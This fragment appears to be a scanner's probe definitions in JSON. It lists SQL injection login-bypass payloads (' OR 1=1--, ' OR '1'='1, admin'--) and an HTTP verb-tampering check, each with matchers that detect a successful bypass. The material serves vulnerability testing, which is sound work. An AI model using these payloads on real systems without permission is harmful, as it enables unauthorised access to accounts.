    "sqli_login_bypass": {
      "description": "SQL injection on login form. The classic admin/password bypass: inject OR 1=1 into username or password field to bypass WHERE clause. Still works on legacy PHP/ASP apps with string-concatenated queries. Test on both username and password fields.",
      "param_match": [
        "username",
        "user",
        "email",
        "login",
        "password",
        "passwd",
        "pass"
      ],
      "probes": [
        {
          "payload": "' OR 1=1--",
          "description": "Classic OR true bypass",
          "matchers": [
            {
              "type": "status",
              "value": "302"
            },
            {
              "type": "word",
              "words": [
                "dashboard",
                "welcome",
                "logout",
                "profile"
              ]
            }
          ]
        },
        {
          "payload": "' OR '1'='1",
          "description": "String comparison bypass",
          "matchers": [
            {
              "type": "status",
              "value": "302"
            }
          ]
        },
        {
          "payload": "admin'--",
          "description": "Comment out password check",
          "matchers": [
            {
              "type": "status",
              "value": "302"
            }
          ]
        }
      ]
    },
    "verb_tampering_auth": {
      "description": "HTTP verb tampering on authenticated endpoints. Some frameworks enforce auth only on POST but not GET/PUT/PATCH/DELETE. Replay a POST-only endpoint with GET or HEAD to bypass authentication middleware.",
      "probes": [
        {
          "payload": "{{baseline}}",
          "description": "Replay authenticated POST endpoint as GET \u2014 if 200 with data, auth is method-specific",
          "matchers": [
            {
              "type": "status",
              "value": "200"
            }
          ]
        }
      ]
    }
  }
}